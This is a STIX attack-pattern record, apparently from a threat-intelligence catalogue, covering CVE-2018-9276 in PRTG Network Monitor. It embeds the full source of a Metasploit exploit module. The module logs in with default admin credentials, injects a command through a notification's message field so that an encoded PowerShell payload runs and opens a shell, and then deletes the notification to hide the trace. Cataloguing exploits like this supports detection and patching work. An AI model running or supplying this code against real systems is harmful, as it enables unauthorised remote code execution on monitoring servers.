{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--13389c67-f287-4c46-8a0b-ecc7ab328338",
    "created": "2024-08-14T16:53:29.017974Z",
    "modified": "2024-08-14T16:53:29.017979Z",
    "name": "PRTG Network Monitor Authenticated RCE",
    "description": " Notifications can be created by an authenticated user and can execute scripts when triggered. Due to a poorly validated input on the script name, it is possible to chain it with a user-supplied command allowing command execution under the context of privileged user. The module uses provided credentials to log in to the web interface, then creates and triggers a malicious notification to perform RCE using a Powershell payload. It may require a few tries to get a shell because notifications are queued up on the server. This vulnerability affects versions prior to 18.2.39. See references for more details about the vulnerability allowing RCE.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/prtg_authenticated_rce.rb",
            "external_id": "prtg_authenticated_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-9276"
        },
        {
            "source_name": "reference",
            "url": "https://www.codewatch.org/blog/?p=453"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core/exploit/powershell'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'PRTG Network Monitor Authenticated RCE',\n        'Description' => %q{\n          Notifications can be created by an authenticated user and can execute scripts when triggered.\n          Due to a poorly validated input on the script name, it is possible to chain it with a user-supplied command allowing command execution under the context of privileged user.\n          The module uses provided credentials to log in to the web interface, then creates and triggers a malicious notification to perform RCE using a Powershell payload.\n          It may require a few tries to get a shell because notifications are queued up on the server.\n          This vulnerability affects versions prior to 18.2.39. See references for more details about the vulnerability allowing RCE.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Josh Berry <josh.berry[at]codewatch.org>', # original discovery\n          'Julien Bedel <contact[at]julienbedel.com>', # module writer\n        ],\n        'References' => [\n          ['CVE', '2018-9276'],\n          ['URL', 'https://www.codewatch.org/blog/?p=453']\n        ],\n        'Platform' => 'win',\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'Targets' => [\n          ['Automatic Targeting', { 'auto' => true }]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'WfsDelay' => 30 # because notification triggers are queuded up on the server\n        },\n        'DisclosureDate' => '2018-06-25'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('ADMIN_USERNAME', [true, 'The username to authenticate as', 'prtgadmin']),\n        OptString.new('ADMIN_PASSWORD', [true, 'The password for the specified username', 'prtgadmin'])\n      ]\n    )\n  end\n\n  def prtg_connect\n    begin\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(datastore['URI'], 'public', 'checklogin.htm'),\n        'vars_post' => {\n          'loginurl' => '',\n          'username' => datastore['ADMIN_USERNAME'],\n          'password' => datastore['ADMIN_PASSWORD']\n        }\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, 'Failed to reach remote host')\n    ensure\n      disconnect\n    end\n\n    if res && res.code == 302 && res.headers['LOCATION'] == '/home' && res.get_cookies\n      @cookies = res.get_cookies.to_s\n      print_good('Successfully logged in with provided credentials')\n      vprint_status(\"Session cookies : #{@cookies}\")\n    else\n      fail_with(Failure::NoAccess, 'Failed to authenticate to the web interface')\n    end\n  end\n\n  def prtg_create_notification(cmd)\n    uri = datastore['URI']\n\n    begin\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(uri, 'editsettings'),\n        'cookie' => @cookies,\n        'headers' => {\n          'X-Requested-With' => 'XMLHttpRequest'\n        },\n        'vars_post' => {\n          'name_' => Rex::Text.rand_text_alphanumeric(4..24),\n          'active_' => '1',\n          'schedule_' => '-1|None|',\n          'postpone_' => '1',\n          'summode_' => '2',\n          'summarysubject_' => '[%sitename] %summarycount Summarized Notifications',\n          'summinutes_' => '1',\n          'accessrights_' => '1',\n          'accessrights_201' => '0',\n          'active_1' => '0',\n          'addressuserid_1' => '-1',\n          'addressgroupid_1' => '-1',\n          'subject_1' => '[%sitename] %device %name %status %down (%message)',\n          'contenttype_1' => 'text/html',\n          'priority_1' => '0',\n          'active_17' => '0',\n          'addressuserid_17' => '-1',\n          'addressgroupid_17' => '-1',\n          'message_17' => '[%sitename] %device %name %status %down (%message)',\n          'active_8' => '0',\n          'addressuserid_8' => '-1',\n          'addressgroupid_8' => '-1',\n          'message_8' => '[%sitename] %device %name %status %down (%message)',\n          'active_2' => '0',\n          'eventlogfile_2' => 'application',\n          'sender_2' => 'PRTG Network Monitor',\n          'eventtype_2' => 'error',\n          'message_2' => '[%sitename] %device %name %status %down (%message)',\n          'active_13' => '0',\n          'syslogport_13' => '514',\n          'syslogfacility_13' => '1',\n          'syslogencoding_13' => '1',\n          'message_13' => '[%sitename] %device %name %status %down (%message)',\n          'active_14' => '0',\n          'snmpport_14' => '162',\n          'snmptrapspec_14' => '0',\n          'messageid_14' => '0',\n          'message_14' => '[%sitename] %device %name %status %down (%message)',\n          'active_9' => '0',\n          'urlsniselect_9' => '0',\n          'active_10' => '10',\n          'address_10' => 'Demo EXE Notification - OutFile.ps1',\n          'message_10' => \"abcd; #{cmd}\",\n          'timeout_10' => '60',\n          'active_15' => '0',\n          'message_15' => '[%sitename] %device %name %status %down (%message)',\n          'active_16' => '0',\n          'isusergroup_16' => '1',\n          'addressgroupid_16' => '200|PRTG Administrators',\n          'ticketuserid_16' => '100|PRTG System Administrator',\n          'subject_16' => '%device %name %status %down (%message)',\n          'message_16' => 'Sensor: %name\\r\\nStatus: %status %down\\r\\n\\r\\nDate/Time: %datetime (%timezone)\\r\\nLast Result: %lastvalue\\r\\nLast Message: %message\\r\\n\\r\\nProbe: %probe\\r\\nGroup: %group\\r\\nDevice: %device (%host)\\r\\n\\r\\nLast Scan: %lastcheck\\r\\nLast Up: %lastup\\r\\nLast Down: %lastdown\\r\\nUptime: %uptime\\r\\nDowntime: %downtime\\r\\nCumulated since: %cumsince\\r\\nLocation: %location\\r\\n\\r\\n',\n          'autoclose_16' => '1',\n          'objecttype' => 'notification',\n          'id' => 'new',\n          'targeturl' => '/myaccount.htm?tabid=2'\n        }\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, 'Failed to reach remote host')\n    ensure\n      disconnect\n    end\n\n    if res && res.code == 200 && res.get_json_document['objid'] && !res.get_json_document['objid'].empty?\n      @objid = res.get_json_document['objid']\n      print_good(\"Created malicious notification (objid=#{@objid})\")\n      vprint_status(\"Payload : #{cmd}\")\n    else\n      fail_with(Failure::Unknown, 'Failed to create malicious notification')\n    end\n  end\n\n  def prtg_trigger_notification\n    uri = datastore['URI']\n\n    begin\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(uri, 'api', 'notificationtest.htm'),\n        'cookie' => @cookies,\n        'headers' => {\n          'X-Requested-With' => 'XMLHttpRequest'\n        },\n        'vars_post' => {\n          'id' => @objid\n        }\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, 'Failed to reach remote host')\n    ensure\n      disconnect\n    end\n\n    if res && res.code == 200 && (res.to_s.include? 'EXE notification is queued up')\n      print_good('Triggered malicious notification')\n    else\n      fail_with(Failure::Unknown, 'Failed to trigger malicious notification')\n    end\n  end\n\n  def prtg_delete_notification\n    uri = datastore['URI']\n\n    begin\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(uri, 'api', 'deleteobject.htm'),\n        'cookie' => @cookies,\n        'headers' => {\n          'X-Requested-With' => 'XMLHttpRequest'\n        },\n        'vars_post' => {\n          'id' => @objid,\n          'approve' => '1'\n        }\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, 'Failed to reach remote host')\n    ensure\n      disconnect\n    end\n\n    if res\n      print_good('Deleted malicious notification')\n    else\n      fail_with(Failure::Unknown, 'Failed to delete malicious notification')\n    end\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(datastore['URI'], '/index.htm')\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError\n      return CheckCode::Unknown\n    ensure\n      disconnect\n    end\n\n    if res && res.code == 200\n      # checks for PRTG version in http headers first, if not found looks for it in html\n      version_match = /\\d{1,2}\\.\\d{1}\\.\\d{1,2}\\.\\d*/\n      prtg_server_header = res.headers['Server']\n      if prtg_server_header && prtg_server_header =~ version_match\n        prtg_version = prtg_server_header[version_match]\n      else\n        html = res.get_html_document\n        prtg_version_html = html.at('span[@class=\"prtgversion\"]')\n        if prtg_version_html && prtg_version_html.text =~ version_match\n          prtg_version = prtg_version_html.text[version_match]\n        end\n      end\n\n      if prtg_version\n        vprint_status(\"Identified PRTG Network Monitor Version #{prtg_version}\")\n        if Rex::Version.new(prtg_version) < Rex::Version.new('18.2.39')\n          return CheckCode::Appears\n        else\n          return CheckCode::Safe\n        end\n      elsif (prtg_server_header.include? 'PRTG') || (html.to_s.include? 'PRTG')\n        return CheckCode::Detected\n      end\n    end\n\n    return CheckCode::Unknown\n  end\n\n  def exploit\n    powershell_options = {\n      # method: 'direct',\n      remove_comspec: true,\n      wrap_double_quotes: true,\n      encode_final_payload: true\n    }\n    ps_payload = cmd_psh_payload(payload.encoded, payload_instance.arch.first, powershell_options)\n    prtg_connect\n    prtg_create_notification(ps_payload)\n    prtg_trigger_notification\n    prtg_delete_notification\n    print_status(\"Waiting for payload execution.. (#{datastore['WfsDelay']} sec. max)\")\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2018-06-25",
    "x_mitre_platforms": [
        "win'"
    ]
}